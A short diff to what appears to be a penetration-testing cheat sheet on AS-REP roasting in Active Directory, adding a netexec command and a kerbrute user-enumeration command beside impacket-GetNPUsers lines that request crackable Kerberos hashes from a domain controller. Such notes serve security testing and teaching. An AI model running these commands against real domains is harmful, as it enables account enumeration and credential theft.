@@ -51,12 +51,16 @@ impacket-GetNPUsers $DOMAIN/$user
 
 # Requesting tickets
 impacket-GetNPUsers $DOMAIN/$user -request
+
+# Using crackmapexec
+netexec ldap $DC_IP -u username -p password --asreproast asreproast.out
 ```
 
 - Finding Vulnerable Accounts without Authentication:
 
 ```shell
 impacket-GetNPUsers $DOMAIN/ -dc-ip $IP -usersfile /tmp/users.txt -format hashcat -outputfile /tmp/hashes.txt -no-pass
+kerbrute userenum -d $DOMAIN --dc $DC_IP wordlist.txt
 ```
 
 - Cracking hashes
